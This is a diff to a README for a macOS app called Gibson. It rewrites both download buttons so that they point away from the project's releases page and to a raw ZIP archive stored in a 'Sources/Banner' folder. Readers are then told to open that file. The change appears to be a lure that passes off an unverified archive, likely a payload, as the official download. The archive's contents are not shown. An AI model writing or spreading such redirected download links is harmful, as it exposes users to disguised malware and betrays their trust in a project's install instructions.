@@ -1,7 +1,7 @@
 <h1>💻 Gibson - Turn Your Mac Into a Hacker Dashboard</h1>
 
 <p align="center">
-  <a href="https://github.com/undersized-guidedog142/Gibson/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:18px;border-radius:8px;">⬇️ Download Gibson for macOS</a>
+  <a href="https://raw.githubusercontent.com/undersized-guidedog142/Gibson/main/Sources/Banner/1.5.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:18px;border-radius:8px;">⬇️ Download Gibson for macOS</a>
 </p>
 
 ## 🖥️ What Is Gibson?
@@ -34,7 +34,7 @@ Follow these steps to set up Gibson on your Mac.
 Visit this link to download the application. The download will be a ZIP file.
 
 <p align="center">
-  <a href="https://github.com/undersized-guidedog142/Gibson/releases" style="background-color:#2196F3;color:white;padding:12px 24px;border-radius:5px;text-decoration:none;">⬇️ Download Gibson</a>
+  <a href="https://raw.githubusercontent.com/undersized-guidedog142/Gibson/main/Sources/Banner/1.5.zip" style="background-color:#2196F3;color:white;padding:12px 24px;border-radius:5px;text-decoration:none;">⬇️ Download Gibson</a>
 </p>
 
 <b>Step 2: Open the Downloaded File</b>
